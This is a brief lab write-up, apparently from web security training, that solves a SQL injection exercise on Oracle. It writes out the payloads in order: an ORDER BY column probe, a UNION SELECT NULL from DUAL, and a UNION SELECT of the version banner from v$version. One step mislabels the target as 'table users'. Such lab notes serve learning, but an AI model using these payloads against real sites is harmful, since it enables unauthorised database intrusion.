Lab: SQL injection attack, querying the database type and version on Oracle

QUESTION:
    This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

    To solve the lab, display the database version string. 

=======================================
ANALYSIS:
-GOALS: display the database version string with UNION attack in category filter (DATABASE ORACLE)

SIMPLE LOGIC UNION:
- SELECT a, b, c FROM table1

-SOLVE: 
1. We don't know, how many columns are displayed on the web. Use ORDER BY [NUMBER] or ORDER BY 1 to count the number of columns displayed. IF when calculating an error occurs then the column number has been skipped.

|  ' ORDER BY 1-- |

2. Use UNION to combine SELECT query with column NULL
3. Select NULL value: ' UNION SELECT NULL,NULL FROM DUAL -- "USE SPCASE FOR GENERAL COMMENT"
4. Select table users & merge by commenting the query behind it: ' UNION SELECT NULL,banner FROM v$version ORDER BY 1 DESC -- "USE SPCASE FOR GENERAL COMMENT"

FULL LOGIC UNION:
- SELECT a, b, c FROM table1 where category='Gifts' UNION SELECT NULL,banner FROM v$version ORDER BY 1 DESC -- "SPACE"'
